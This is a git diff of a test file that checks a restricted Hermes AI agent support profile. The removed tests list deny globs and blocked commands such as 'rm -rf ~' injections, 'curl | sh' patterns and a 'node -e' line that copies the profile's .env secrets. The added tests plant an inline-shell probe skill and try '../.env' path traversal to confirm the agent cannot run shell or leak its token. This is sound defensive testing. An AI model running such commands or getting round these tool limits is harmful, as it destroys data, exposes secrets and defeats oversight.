@@ -35,76 +35,44 @@ const fails = (file, args, env) => {
   try { run(file, args, env); } catch (e) { return e; }
   assert.fail('expected a refusal');
 };
-
-// Hermes matches an allowlist entry against the whole line (fnmatch, case-sensitive)
-// and skips the match when the line has a shell operator. Deny globs are
-// case-insensitive and also see the command split on &&, ; and |. This is the
-// copy of tools/approval_floors.py used when that tree is not on the machine.
-const SHELL_CONTROL = new Set(['\n', '\r', ';', '&', '|', '<', '>', '`', '$', '(', ')']);
-const REINTERPRETED = /(?:^|[ \t])(?:-[^-\s]*[ce]|--(?:command|eval))(?:[= \t]|$)/;
-const hasShellOperator = (command) => {
-  command = command || '';
-  let quote = null;
-  let quotedControl = false;
-  for (let i = 0; i < command.length; i += 1) {
-    const ch = command[i];
-    if (ch === '\\' && quote !== "'") {
-      const nxt = command[i + 1] || '';
-      if (SHELL_CONTROL.has(nxt)) quotedControl = true;
-      i += 1;
-      continue;
-    }
-    if (quote) {
-      if (ch === quote) quote = null;
-      else if (quote === '"' && (ch === '`' || ch === '$')) return true;
-      else if (SHELL_CONTROL.has(ch)) quotedControl = true;
-    } else if (ch === "'" || ch === '"') quote = ch;
-    else if (ch === '$') { if (command[i + 1] === '(') return true; }
-    else if (SHELL_CONTROL.has(ch) && ch !== '(' && ch !== ')') return true;
-  }
-  if (quote) return true;
-  return quotedControl && REINTERPRETED.test(command);
-};
-const fnmatchcase = (name, pat) => {
-  let src = '';
-  for (let i = 0; i < pat.length; i += 1) {
-    const c = pat[i];
-    if (c === '*') src += '[\\s\\S]*';
-    else if (c === '?') src += '[\\s\\S]';
-    else src += c.replace(/[\\^$.*+?(){}|[\]-]/g, '\\$&');
-  }
-  return new RegExp(`^${src}$`).test(name);
-};
-const allowMatch = (command, patterns) => {
-  const line = String(command || '').trim();
-  if (!line || hasShellOperator(line)) return false;
-  return patterns.some((pattern) => {
-    const item = String(pattern).trim();
-    if (!item) return false;
-    if (line === item) return true;
-    return /[*?\[]/.test(item) && fnmatchcase(line, item);
+// The plugin uses the standard library. A python.org venv launcher posix_spawns
+// the real interpreter and can exit first, so Node never sees the pipes close.
+const pluginPy = () => 'python3';
+// spawn, not execFileSync: inbox.mjs talks to the server in this process, and a
+// synchronous wait would stop that server answering.
+const pluginCall = (pluginPath, toolName, params, env) => new Promise((resolve, reject) => {
+  // The framework venv's python is a launcher. It can exit while the real
+  // interpreter still holds the pipes, so 'close' never arrives. 'exit' does.
+  const child = spawn(pluginPy(), ['-c', `
+import importlib.util, json, sys
+spec = importlib.util.spec_from_file_location("tess_visit", sys.argv[1])
+mod = importlib.util.module_from_spec(spec)
+spec.loader.exec_module(mod)
+tools = {}
+class Ctx:
+    def register_tool(self, **kw):
+        tools[kw["name"]] = kw
+    def register_hook(self, name, cb):
+        pass
+mod.register(Ctx())
+print(tools[sys.argv[2]]["handler"](json.loads(sys.argv[3])))
+`, pluginPath, toolName, JSON.stringify(params ?? {})], { env, stdio: ['ignore', 'pipe', 'pipe'] });
+  let stdout = '';
+  let stderr = '';
+  const timer = setTimeout(() => {
+    child.kill('SIGKILL');
+    reject(new Error(`plugin call timed out: ${toolName}`));
+  }, 20000);
+  child.stdout.on('data', (chunk) => { stdout += chunk; });
+  child.stderr.on('data', (chunk) => { stderr += chunk; });
+  child.on('error', (err) => { clearTimeout(timer); reject(err); });
+  child.on('exit', (status) => {
+    clearTimeout(timer);
+    if (status === 0) resolve(stdout);
+    else reject(Object.assign(new Error(stderr || stdout || 'plugin call failed'), { status, stdout, stderr }));
   });
-};
-const denyMatch = (command, patterns) => {
-  const globs = patterns.map((item) => String(item).trim()).filter(Boolean);
-  const pieces = [command];
-  for (const part of String(command).split(/&&|[;|]/)) {
-    const piece = part.trim();
-    if (piece) pieces.push(piece);
-  }
-  const first = String(command).match(/^(\S+)([\s\S]*)$/);
-  if (first) {
-    const base = first[1].split('/').pop();
-    if (base !== first[1]) pieces.push(base + first[2]);
-  }
-  for (const variant of pieces) {
-    const candidate = variant.toLowerCase().trim();
-    for (const pattern of globs) {
-      if (fnmatchcase(candidate, pattern.toLowerCase())) return pattern;
-    }
-  }
-  return null;
-};
+});
+
 const yamlItems = (text, header) => {
   const lines = text.split('\n');
   const start = lines.findIndex((line) => line === header);
@@ -120,47 +88,6 @@ const yamlItems = (text, header) => {
     items.push(item[1]);
   }
   return items;
-};
-// The real matcher, when this machine has the Hermes tree the profile is written for.
-const hermesVerdicts = (allow, deny, commands) => {
-  const root = process.env.HERMES_AGENT_SRC || '/Volumes/DellSSD/iMac-offload/.hermes/hermes-agent';
-  if (!existsSync(join(root, 'tools/approval_floors.py'))) return null;
-  const script = `
-import fnmatch, json, re, sys
-from pathlib import Path
-root = Path(sys.argv[1])
-sys.path.insert(0, str(root))
-from tools.approval_detection import _deny_command_variants
-text = (root / "tools/approval_floors.py").read_text()
-ns = {"re": re}
-exec(text[text.index("_SHELL_CONTROL_CHARS"):text.index("def _command_matches_permanent_allowlist")], ns)
-has_op = ns["_has_allowlist_shell_operator"]
-payload = json.load(sys.stdin)
-allow, deny, commands = payload["allow"], payload["deny"], payload["commands"]
-def allow_match(command):
-    command = (command or "").strip()
-    if not command or has_op(command):
-        return False
-    for pattern in allow:
-        pattern = pattern.strip() if isinstance(pattern, str) else ""
-        if pattern and (command == pattern or (any(ch in pattern for ch in "*?[") and fnmatch.fnmatchcase(command, pattern))):
-            return True
-    return False
-def deny_match(command):
-    globs = [p.strip() for p in deny if isinstance(p, str) and p.strip()]
-    for variant in _deny_command_variants(command):
-        candidate = variant.lower().strip()
-        for pattern in globs:
-            if fnmatch.fnmatchcase(candidate, pattern.lower()):
-                return pattern
-    return None
-json.dump([{"allow": allow_match(c), "deny": bool(deny_match(c))} for c in commands], sys.stdout)
-`;
-  const child = spawnSync('python3', ['-c', script, root], {
-    input: JSON.stringify({ allow, deny, commands }), encoding: 'utf8',
-  });
-  if (child.status !== 0) throw new Error(child.stderr || 'hermes matcher failed');
-  return JSON.parse(child.stdout);
 };
 
 const loginHome = () => {
@@ -204,16 +131,19 @@ const baseEnv = {
   LANG: 'C',
 };
 
+let visitServer;
 try {
   // A missing scratch home is a refusal, and a path inside the real login home is never created.
   const missing = fails(install, [], baseEnv);
   assert.match(String(missing.stderr), /scratch directory/);
   const real = loginHome();
-  const planted = join(real, '.tess-support-mac-must-not-exist');
-  assert.equal(existsSync(planted), false);
-  const refused = fails(install, [], { ...baseEnv, HERMES_HOME: planted, TESS_SUPPORT_TOKEN: token });
-  assert.match(String(refused.stderr), /real home folder/);
-  assert.equal(existsSync(planted), false, 'the installer created a directory in the real home');
+  if (real) {
+    const planted = join(real, '.tess-support-mac-must-not-exist');
+    assert.equal(existsSync(planted), false);
+    const refused = fails(install, [], { ...baseEnv, HERMES_HOME: planted, TESS_SUPPORT_TOKEN: token });
+    assert.match(String(refused.stderr), /real home folder/);
+    assert.equal(existsSync(planted), false, 'the installer created a directory in the real home');
+  }
 
   const seen = [];
   const server = await listen((req, res) => {
@@ -253,86 +183,104 @@ try {
   assert.doesNotMatch(cfg, /opencode-go|OPENCODE_GO/);
   const shipped = readFileSync(join(root, 'support/mac/config.yaml'), 'utf8');
   assert.doesNotMatch(shipped, /Dangerous patterns that are already approved/);
-  const node = 'node $HERMES_HOME';
-  const allow = [
-    'tail -40 $HOME/Library/Application\\ Support/Tess/guard.log',
-    `${node}/skills/tess-gather/scripts/doctor.mjs *`,
-    `${node}/skills/tess-evidence/scripts/spotify-window.mjs`,
-    `${node}/skills/tess-evidence/scripts/spotify-window.mjs still */cache/support/sessions/*/spotify.png`,
-    `${node}/skills/tess-support/scripts/session.mjs new`,
-    `${node}/skills/tess-support/scripts/session.mjs sweep`,
-    `${node}/skills/tess-support/scripts/session.mjs handoff *`,
-    `${node}/skills/tess-support/scripts/inbox.mjs issues`,
-    `${node}/skills/tess-support/scripts/inbox.mjs report *`,
-    `${node}/skills/tess-support/scripts/inbox.mjs recording *`,
-    `${node}/skills/tess-handoff/scripts/triage-inbox.mjs --report * --words * --title-file * --summary-file * --mode inbox`,
-    `${node}/skills/tess-handoff/scripts/triage-inbox.mjs --report * --words * --title-file * --summary-file * --also * --mode inbox`,
-  ];
-  const deny = [
-    'sudo *', 'rm -rf *', 'rm -fr *', 'chmod -R *', 'dd *', 'mkfs*',
-    'launchctl bootstrap*', 'launchctl submit*',
-    '*curl*|*sh*', '*curl*|*bash*', '*/Applications/Spotify.app*',
-    '*screencapture*', '*osascript*',
-    'node -e*', 'node --eval*', 'node -p*',
-    '*&&*', '*;*', '*|*', '*`*', '*$(*',
-  ];
-  assert.deepEqual(yamlItems(shipped, 'command_allowlist:'), allow);
-  assert.deepEqual(yamlItems(shipped, '  deny:'), deny);
-  assert.deepEqual(yamlItems(cfg, 'command_allowlist:'), allow);
-  assert.deepEqual(yamlItems(cfg, '  deny:'), deny);
-  const pass = [
-    'tail -40 $HOME/Library/Application\\ Support/Tess/guard.log',
-    `${node}/skills/tess-gather/scripts/doctor.mjs /tmp/sess`,
-    `${node}/skills/tess-evidence/scripts/spotify-window.mjs`,
-    `${node}/skills/tess-evidence/scripts/spotify-window.mjs still /tmp/cache/support/sessions/visit/spotify.png`,
-    `${node}/skills/tess-support/scripts/session.mjs new`,
-    `${node}/skills/tess-support/scripts/session.mjs sweep`,
-    `${node}/skills/tess-support/scripts/session.mjs handoff /tmp/cache/support/sessions/visit 12`,
-    `${node}/skills/tess-support/scripts/inbox.mjs issues`,
-    `${node}/skills/tess-support/scripts/inbox.mjs report /tmp/sess`,
-    `${node}/skills/tess-support/scripts/inbox.mjs recording 12 /tmp/sess/spotify.mov`,
-    `${node}/skills/tess-support/scripts/inbox.mjs recording 12 /tmp/sess/spotify.png`,
-    `${node}/skills/tess-handoff/scripts/triage-inbox.mjs --report /tmp/cache/support/sessions/visit/doctor.txt --words /tmp/cache/support/sessions/visit/words.txt --title-file /tmp/cache/support/sessions/visit/title.txt --summary-file /tmp/cache/support/sessions/visit/summary.txt --mode inbox`,
-    `${node}/skills/tess-handoff/scripts/triage-inbox.mjs --report /tmp/cache/support/sessions/visit/doctor.txt --words /tmp/cache/support/sessions/visit/words.txt --title-file /tmp/cache/support/sessions/visit/title.txt --summary-file /tmp/cache/support/sessions/visit/summary.txt --related 61 --mode inbox`,
-    `${node}/skills/tess-handoff/scripts/triage-inbox.mjs --report /tmp/cache/support/sessions/visit/doctor.txt --words /tmp/cache/support/sessions/visit/words.txt --title-file /tmp/cache/support/sessions/visit/title.txt --summary-file /tmp/cache/support/sessions/visit/summary.txt --also area:theme --mode inbox`,
-  ];
-  const blocked = [
-    'node -e \'fs.copyFileSync(env.HOME+"/.hermes/profiles/tess-support/.env","/tmp/x")\' x-triage.mjs',
-    'node --eval process.exit',
-    'node -p process.version',
-    'tess doctor && rm -rf ~',
-    'tess doctor; rm -rf ~',
-    'tess doctor | sh',
-    'echo `rm -rf ~`',
-    'echo $(rm -rf ~)',
-    '/usr/sbin/screencapture -x -l 1 -D 1 /tmp/spotify.png',
-    'screencapture -x /tmp/desktop.png',
-    'osascript -e \'tell application "Spotify"\'',
-  ];
-  const commands = [...pass, ...blocked, 'tess doctor --help', `node /tmp/evil.mjs ${node}/skills/tess-support/scripts/session.mjs new`];
-  const local = commands.map((command) => ({ allow: allowMatch(command, allow), deny: Boolean(denyMatch(command, deny)) }));
-  const hermes = hermesVerdicts(allow, deny, commands);
-  if (hermes) assert.deepEqual(hermes, local, 'the copy of the matcher disagrees with Hermes');
-  pass.forEach((command, i) => {
-    assert.equal(local[i].allow, true, `not pre-approved: ${command}`);
-    assert.equal(local[i].deny, false, `denied an intended call: ${command}`);
-  });
-  blocked.forEach((command, i) => {
-    const verdict = local[pass.length + i];
-    assert.equal(verdict.allow, false, `pre-approved a refused line: ${command}`);
-    assert.equal(verdict.deny, true, `not denied: ${command}`);
-  });
-  assert.equal(allowMatch('tess doctor', allow), false, 'tess doctor is not pre-approved; doctor.mjs saves the output');
-  assert.equal(allowMatch('zsh $HOME/Library/Application\\ Support/Tess/doctor.sh', allow), false, 'doctor.sh is not pre-approved');
-  assert.equal(local[commands.length - 2].allow, false, 'tess doctor --help is broader than the doctor script');
-  assert.equal(local[commands.length - 1].allow, false, 'a different program in front of session.mjs was pre-approved');
-  assert.equal(allowMatch(`${node}/skills/tess-evidence/scripts/spotify-window.mjs still /tmp/spotify.png`, allow), false, 'a still outside the session root was pre-approved');
-  assert.equal(allowMatch(`${node}/skills/tess-evidence/scripts/spotify-window.mjs video $HERMES_HOME/cache/support/spotify.mov`, allow), false, 'video capture was pre-approved');
-  assert.equal(allowMatch(`${node}/skills/tess-support/scripts/session.mjs add /tmp/sess $HERMES_HOME/cache/support/spotify.mov --record`, allow), false, 'session add was pre-approved');
-  assert.equal(allowMatch(`${node}/skills/tess-handoff/scripts/triage-inbox.mjs --report /tmp/cache/support/sessions/visit/doctor.txt --words /tmp/cache/support/sessions/visit/words.txt --title-file /tmp/cache/support/sessions/visit/title.txt --summary-file /tmp/cache/support/sessions/visit/summary.txt --mode inbox --also area:theme`, allow), false, '--also after --mode inbox was pre-approved');
+  assert.doesNotMatch(shipped, /command_allowlist:/);
+  assert.doesNotMatch(shipped, /^  deny:/m);
   assert.match(shipped, /write_approval:\s*true/);
-  for (const name of ['vision', 'catalog', 'project']) {
-    assert.match(shipped, new RegExp(`^    - ${name}$`, 'm'), `${name} is still enabled`);
+  assert.match(shipped, /allow_tool_override:\s*true/);
+  assert.match(shipped, /mcp_servers:\s*\{\}/);
+  const off = [
+    'terminal', 'code_execution', 'delegation', 'browser', 'computer_use', 'file',
+    'cronjob', 'video', 'video_gen', 'image_gen', 'tts', 'memory', 'todo',
+    'session_search', 'vision', 'web', 'connections', 'catalog', 'project',
+    'desktop_ui', 'discord', 'discord_admin', 'yuanbao', 'kanban', 'x_search',
+    'feishu_doc', 'feishu_drive', 'onboarding',
+  ];
+  assert.match(shipped, /inline_shell:\s*false/);
+  assert.match(shipped, /tool_search:\n {4}enabled:\s*"off"/);
+  const disabled = yamlItems(shipped, '  disabled_toolsets:');
+  for (const name of off) assert.ok(disabled.includes(name), `${name} is still enabled`);
+  assert.deepEqual(yamlItems(cfg, '  disabled_toolsets:'), disabled);
+  const hermesSrc = process.env.HERMES_AGENT_SRC || '/tmp/hermes-agent';
+  const hermesPy = existsSync('/tmp/hermes-venv/bin/python') ? '/tmp/hermes-venv/bin/python' : 'python3';
+  const pluginFile = join(root, 'support/mac/plugins/tess-visit/__init__.py');
+  const hermesHomeForImport = join(box, 'hermes-import');
+  mkdirSync(hermesHomeForImport, { recursive: true });
+  writeFileSync(join(hermesHomeForImport, 'config.yaml'), shipped);
+  console.error('mac-test: hermes list starting');
+  const hermesList = spawnSync(hermesPy, ['-c', `
+import json, os, shutil, sys
+from pathlib import Path
+os.environ["HERMES_HOME"] = sys.argv[2]
+os.environ["HOME"] = sys.argv[2]
+sys.path.insert(0, sys.argv[1])
+try:
+    import tools.terminal_tool
+    from model_tools import get_tool_definitions
+    from tools.registry import registry
+except Exception as exc:
+    print("SKIP: Hermes toolset resolution was not imported (%s: %s)." % (type(exc).__name__, exc))
+    raise SystemExit(0)
+disabled = json.loads(sys.argv[3])
+def listed(**kw):
+    defs = get_tool_definitions(disabled_toolsets=disabled, quiet_mode=True, **kw)
+    return sorted({t["function"]["name"] for t in defs})
+before = listed()
+registered = {entry.name for entry in registry._snapshot_entries()}
+if "terminal" not in registered:
+    print("SKIP: Hermes toolset resolution was not imported (terminal_tool did not register).")
+    raise SystemExit(0)
+home = Path(sys.argv[2])
+dest = home / "plugins" / "tess-visit"
+dest.mkdir(parents=True)
+src = Path(sys.argv[4])
+shutil.copy(src, dest / "__init__.py")
+shutil.copy(src.parent / "plugin.yaml", dest / "plugin.yaml")
+from hermes_cli.plugins import get_plugin_manager
+mgr = get_plugin_manager()
+mgr.discover_and_load(force=True)
+loaded = mgr._plugins.get("tess-visit")
+if loaded is None or not loaded.enabled:
+    print("plugin load failed: %s" % (getattr(loaded, "error", None) or "missing"))
+    raise SystemExit(1)
+after = listed()
+raw = listed(skip_tool_search_assembly=True)
+print(json.dumps({"before": before, "after": after, "raw": raw}))
+`, hermesSrc, hermesHomeForImport, JSON.stringify(disabled), pluginFile], {
+    encoding: 'utf8',
+    env: { PATH: process.env.PATH || '', HOME: hermesHomeForImport, LANG: 'C', PYTHONDONTWRITEBYTECODE: '1' },
+  });
+  console.error('mac-test: hermes list returned');
+  const hermesText = `${hermesList.stdout || ''}${hermesList.stderr || ''}`;
+  if (hermesText.includes('SKIP:')) {
+    console.error(`\n${hermesText.trim()}\nThe Mac tool-list check did not run.\n`);
+  } else {
+    if (hermesList.status !== 0) throw new Error(hermesText || 'hermes tool list failed');
+    const listed = JSON.parse(hermesList.stdout.trim().split('\n').filter(Boolean).pop());
+    const forbidden = [
+      'terminal', 'process', 'process_manage', 'write_file', 'patch', 'read_file', 'search_files',
+      'execute_code', 'delegate_task', 'cronjob_manage', 'computer_use', 'browser_exec',
+      'image_generate', 'video_generate', 'video_analyze', 'text_to_speech', 'memory', 'todo_list',
+      'manage_catalog', 'desktop_project', 'feishu_drive_add_comment', 'feishu_drive_reply_comment',
+      'setup_beat',
+    ];
+    for (const name of forbidden) {
+      assert.equal(listed.before.includes(name), false, `${name} is on the model's tool list`);
+    }
+    // skill_manage is glued to skill_view. The real plugin load hides it. A direct
+    // deregister is not what Hermes allows a profile plugin to do.
+    assert.equal(listed.before.includes('skill_manage'), true, 'skill_manage was not loaded, so the drop was not tested');
+    assert.equal(listed.after.includes('skill_manage'), false, 'skill_manage is still on the model tool list');
+    assert.equal(listed.raw.includes('skill_manage'), false, 'skill_manage is still in the tool-search catalog');
+    for (const name of ['skills_list', 'skill_view', 'clarify', 'tess_visit_start', 'tess_doctor', 'tess_consent', 'tess_still', 'tess_post', 'tess_handoff']) {
+      assert.equal(listed.after.includes(name), true, `${name} was removed from the model tool list`);
+    }
+    for (const name of ['tool_search', 'tool_describe', 'tool_call']) {
+      assert.equal(listed.after.includes(name), false, `${name} is on the model's tool list`);
+    }
+    for (const name of forbidden) {
+      assert.equal(listed.after.includes(name), false, `${name} came back after the plugin loaded`);
+      assert.equal(listed.raw.includes(name), false, `${name} is in the catalog the bridge can call`);
+    }
   }
 
   const dot = readFileSync(join(profile, '.env'), 'utf8');
@@ -351,9 +299,12 @@ try {
   assert.doesNotMatch(readFileSync(join(profile, 'skills/tess-evidence/SKILL.md'), 'utf8'), /spotify-window\.mjs video/);
   assert.match(readFileSync(join(profile, 'skills/tess-gather/SKILL.md'), 'utf8'), /tess_save_note/);
   assert.match(readFileSync(join(profile, 'skills/tess-gather/SKILL.md'), 'utf8'), /kind` `doctor`/);
-  assert.match(readFileSync(join(profile, 'skills/tess-handoff/SKILL.md'), 'utf8'), /--also area:theme/);
-  assert.match(cfg, /tess-notes/);
-  assert.ok(existsSync(join(profile, 'plugins/tess-notes/__init__.py')));
+  assert.match(readFileSync(join(profile, 'skills/tess-handoff/SKILL.md'), 'utf8'), /`theme`, `mini`, or `installer`/);
+  assert.match(readFileSync(join(profile, 'skills/tess-support/SKILL.md'), 'utf8'), /tess_visit_start/);
+  assert.doesNotMatch(readFileSync(join(profile, 'skills/tess-support/SKILL.md'), 'utf8'), /node \$HERMES_HOME/);
+  assert.match(cfg, /tess-visit/);
+  assert.ok(existsSync(join(profile, 'plugins/tess-visit/__init__.py')));
+  assert.equal(existsSync(join(profile, 'plugins/tess-notes')), false);
   assert.ok(existsSync(join(profile, 'skills/tess-gather/scripts/doctor.mjs')));
   for (const name of yamlItems(readFileSync(join(root, 'support/mac/distribution.yaml'), 'utf8'), 'distribution_owned:')) {
     assert.ok(existsSync(join(profile, name)), `${name} was not installed`);
@@ -453,12 +404,14 @@ try {
   assert.equal(existsSync(join(evilHome, 'profiles', 'tess-support', '.env')), false, 'a foreign inbox was written into .env');
   const plainHttp = fails(install, [], { ...baseEnv, HERMES_HOME: join(box, 'plain-http'), TESS_SUPPORT_TOKEN: token, TESS_INBOX: 'http://127.0.0.1:9' });
   assert.match(String(plainHttp.stderr), /tess-music-player\.janus\.ing/);
-  const hop = join(box, 'hop-to-login');
-  symlinkSync(real, hop);
-  const viaLink = join(hop, '.tess-support-mac-ancestor-must-not-exist');
-  const ancestor = fails(install, [], { ...baseEnv, HERMES_HOME: viaLink, TESS_SUPPORT_TOKEN: token, TESS_TEST: '1' });
-  assert.match(String(ancestor.stderr), /real home folder/);
-  assert.equal(existsSync(join(real, '.tess-support-mac-ancestor-must-not-exist')), false, 'mkdir followed a symlink into the real home');
+  if (real) {
+    const hop = join(box, 'hop-to-login');
+    symlinkSync(real, hop);
+    const viaLink = join(hop, '.tess-support-mac-ancestor-must-not-exist');
+    const ancestor = fails(install, [], { ...baseEnv, HERMES_HOME: viaLink, TESS_SUPPORT_TOKEN: token, TESS_TEST: '1' });
+    assert.match(String(ancestor.stderr), /real home folder/);
+    assert.equal(existsSync(join(real, '.tess-support-mac-ancestor-must-not-exist')), false, 'mkdir followed a symlink into the real home');
+  }
   const leakedEnv = join(box, 'leaked.env');
   rmSync(join(profile, '.env'));
   symlinkSync(leakedEnv, join(profile, '.env'));
@@ -469,7 +422,7 @@ try {
   // The visit, in the order the skills name, against a fake doctor, a fake capture and a fake inbox.
   // HERMES_HOME for these commands is the profile directory, which is what Hermes sets when the profile runs.
   const posted = [];
-  const visitServer = await listen((req, res) => {
+  visitServer = await listen((req, res) => {
     const chunks = [];
     req.on('data', (c) => chunks.push(c));
     req.on('end', () => {
@@ -526,9 +479,65 @@ try {
     HERMES_HOME: visitProfile,
     TESS_TEST: '1',
     TESS_FAKE_CAPTURE: '1',
+    TESS_NODE: process.execPath,
     TESS_SUPPORT_TOKEN: token,
     TESS_INBOX: `http://127.0.0.1:${visitPort}`,
   };
+  // skill_view can run !`cmd` from a skill file when inline_shell is on. The profile turns it off.
+  // Reading the skills, including a planted one, must not print the token or create a file.
+  const inlineMarker = join(box, 'tess-inline-shell');
+  const probeSkill = join(visitProfile, 'skills', 'tess-inline-probe');
+  mkdirSync(probeSkill);
+  writeFileSync(join(probeSkill, 'SKILL.md'), `---
+name: tess-inline-probe
+description: "Probe skill. Not part of the visit."
+---
+
+!\`touch ${inlineMarker}\`
+`);
+  console.error('mac-test: skill_view starting');
+  const skillSaw = spawnSync(hermesPy, ['-c', `
+import os, sys
+os.environ["HERMES_HOME"] = sys.argv[1]
+os.environ["HOME"] = sys.argv[2]
+sys.path.insert(0, sys.argv[3])
+token, marker = sys.argv[4], sys.argv[5]
+try:
+    from tools.skills_tool import skill_view, skills_list
+except Exception as exc:
+    print("SKIP: skill_view was not imported (%s: %s)." % (type(exc).__name__, exc))
+    raise SystemExit(0)
+view = skill_view("tess-inline-probe")
+if marker not in view:
+    print("the probe skill was not shown to the model")
+    raise SystemExit(1)
+parts = [skills_list(), view]
+for name in ("tess-support", "tess-gather", "tess-evidence", "tess-handoff"):
+    parts.append(skill_view(name))
+parts.append(skill_view("tess-support", file_path="../.env"))
+parts.append(skill_view("tess-support", file_path=".env"))
+text = "\\n".join(str(part) for part in parts)
+print("LEAK" if token and token in text else "clean")
+`, visitProfile, visitEnv.HOME, hermesSrc, token, inlineMarker], {
+    encoding: 'utf8',
+    env: {
+      PATH: process.env.PATH || '',
+      HOME: visitEnv.HOME,
+      HERMES_HOME: visitProfile,
+      LANG: 'C',
+      PYTHONDONTWRITEBYTECODE: '1',
+    },
+  });
+  console.error('mac-test: skill_view returned', skillSaw.status);
+  const skillText = `${skillSaw.stdout || ''}${skillSaw.stderr || ''}`;
+  if (skillText.includes('SKIP:')) {
+    console.error(`\n${skillText.trim()}\nThe skill_view check did not run.\n`);
+  } else {
+    if (skillSaw.status !== 0) throw new Error(skillText || 'skill_view check failed');
+    assert.match(skillSaw.stdout, /clean\n$/);
+    assert.equal(existsSync(inlineMarker), false, 'skill_view ran an inline shell');
+    assert.ok(!skillText.includes(token), 'skill_view printed the token');
+  }
   const sessionScript = join(visitProfile, 'skills/tess-support/scripts/session.mjs');
   const session = run(sessionScript, ['new'], visitEnv).trim();
   const windowScriptVisit = join(visitProfile, 'skills/tess-evidence/scripts/spotify-window.mjs');
@@ -550,47 +559,6 @@ try {
   assert.match(String(videoRefused.stderr), /usage/);
   run(join(visitProfile, 'skills/tess-gather/scripts/doctor.mjs'), [session], visitEnv);
   run(windowScriptVisit, ['still', join(session, 'spotify.png')], visitEnv);
-  const noteScript = join(visitProfile, 'plugins/tess-notes/__init__.py');
-  const saveNote = (kind, text) => JSON.parse(execFileSync('python3', ['-c', `
-import importlib.util, json, sys
-spec = importlib.util.spec_from_file_location("tess_notes", sys.argv[1])
-mod = importlib.util.module_from_spec(spec)
-spec.loader.exec_module(mod)
-try:
-    print(json.dumps(mod.save_note(sys.argv[2], sys.argv[3], sys.argv[4])))
-except ValueError as exc:
-    print(json.dumps({"ok": False, "error": str(exc)}))
-`, noteScript, kind, text, visitProfile], { encoding: 'utf8' }));
-  assert.equal(saveNote('words', 'the lyrics are behind. ada@example.com left /Users/ada/Library/Logs').ok, true);
-  assert.equal(saveNote('title', 'Lyrics sit half a second behind the song').ok, true);
-  assert.equal(saveNote('summary', 'Spotify itself is missing, which is what they noticed.').ok, true);
-  assert.equal(saveNote('../.env', 'no').ok, false, 'a path is not a note');
-  assert.equal(saveNote('words', '').ok, false, 'an empty note is refused');
-  const tooLong = execFileSync('python3', ['-c', `
-import importlib.util, sys
-spec = importlib.util.spec_from_file_location("tess_notes", sys.argv[1])
-mod = importlib.util.module_from_spec(spec)
-spec.loader.exec_module(mod)
-try:
-    mod.save_note("summary", "x" * (64 * 1024 + 1), sys.argv[2])
-except ValueError as exc:
-    if "limit" not in str(exc):
-        raise
-    sys.exit(0)
-sys.exit(2)
-`, noteScript, visitProfile], { encoding: 'utf8' });
-  assert.equal(tooLong, '');
-  const steps = [
-    'node $HERMES_HOME/skills/tess-support/scripts/session.mjs new',
-    `node $HERMES_HOME/skills/tess-gather/scripts/doctor.mjs ${session}`,
-    `node $HERMES_HOME/skills/tess-evidence/scripts/spotify-window.mjs still ${session}/spotify.png`,
-    `node $HERMES_HOME/skills/tess-handoff/scripts/triage-inbox.mjs --report ${session}/doctor.txt --words ${session}/words.txt --title-file ${session}/title.txt --summary-file ${session}/summary.txt --mode inbox`,
-    `node $HERMES_HOME/skills/tess-support/scripts/inbox.mjs report ${session}`,
-    `node $HERMES_HOME/skills/tess-support/scripts/inbox.mjs recording 7 ${session}/spotify.png`,
-    `node $HERMES_HOME/skills/tess-support/scripts/session.mjs handoff ${session} 7`,
-  ];
-  for (const line of steps) assert.equal(allowMatch(line, allow), true, `the visit needs an approval: ${line}`);
-  for (const line of steps) assert.equal(denyMatch(line, deny), null, `the visit is denied: ${line}`);
   const triageInbox = join(visitProfile, 'skills/tess-handoff/scripts/triage-inbox.mjs');
   const elsewhere = join(box, 'elsewhere');
   mkdirSync(elsewhere, { recursive: true });
@@ -607,39 +575,176 @@ sys.exit(2)
   ], visitEnv);
   assert.match(String(wrongName.stderr), /--title-file must be/);
   assert.equal(existsSync(join(session, 'payload.json')), false, 'a refused line still wrote a payload');
-  run(triageInbox, [
-    '--report', join(session, 'doctor.txt'),
-    '--words', join(session, 'words.txt'),
-    '--title-file', join(session, 'title.txt'),
-    '--summary-file', join(session, 'summary.txt'),
-    '--mode', 'inbox',
-  ], visitEnv);
-  const png = readFileSync(join(session, 'spotify.png'));
-  // inbox.mjs talks to the server in this process. A synchronous wait would stop it answering.
-  const reported = await runAsync(join(visitProfile, 'skills/tess-support/scripts/inbox.mjs'), ['report', session], visitEnv);
-  assert.match(reported, /report id: 7/);
-  await runAsync(join(visitProfile, 'skills/tess-support/scripts/inbox.mjs'), ['recording', '7', join(session, 'spotify.png')], visitEnv);
-  run(sessionScript, ['handoff', session, '7'], visitEnv);
-  assert.equal(existsSync(session), false, 'the session folder is deleted after the post');
+
+  const pluginPath = join(visitProfile, 'plugins/tess-visit/__init__.py');
+  const pluginSource = readFileSync(pluginPath, 'utf8');
+  assert.doesNotMatch(pluginSource, /shell\s*=\s*True/);
+  assert.match(pluginSource, /shell=False/);
+  const schemas = JSON.parse(execFileSync(pluginPy(), ['-c', `
+import importlib.util, json, sys
+spec = importlib.util.spec_from_file_location("tess_visit", sys.argv[1])
+mod = importlib.util.module_from_spec(spec)
+spec.loader.exec_module(mod)
+tools = {}
+class Ctx:
+    def register_tool(self, **kw):
+        tools[kw["name"]] = kw["schema"]["parameters"].get("properties", {})
+    def register_hook(self, name, cb):
+        pass
+mod.register(Ctx())
+print(json.dumps({name: sorted(props) for name, props in tools.items()}))
+`, pluginPath], { encoding: 'utf8', env: visitEnv, timeout: 20000, input: '' }));
+  const bannedKeys = ['path', 'command', 'cmd', 'file', 'cwd', 'shell'];
+  for (const [name, keys] of Object.entries(schemas)) {
+    for (const key of keys) assert.equal(bannedKeys.includes(key), false, `${name} takes ${key}`);
+  }
+  const call = async (name, params, env = visitEnv) => {
+    const raw = await pluginCall(pluginPath, name, params, env);
+    assert.ok(!raw.includes(token), `${name} printed the token`);
+    try { return JSON.parse(raw); }
+    catch { assert.fail(`${name} returned ${raw.slice(0, 300)}`); }
+  };
+  const noNode = { ...visitEnv };
+  delete noNode.TESS_NODE;
+  const missingNode = await call('tess_visit_start', {}, noNode);
+  assert.equal(missingNode.ok, false);
+  assert.match(missingNode.error, /no Node runtime/);
+  const bundleHome = join(box, 'bundle-node');
+  mkdirSync(join(bundleHome, 'runtime/node/bin'), { recursive: true });
+  const bundleNode = join(bundleHome, 'runtime/node/bin/node');
+  writeFileSync(bundleNode, '#!/bin/sh\nexit 0\n', { mode: 0o755 });
+  chmodSync(bundleNode, 0o755);
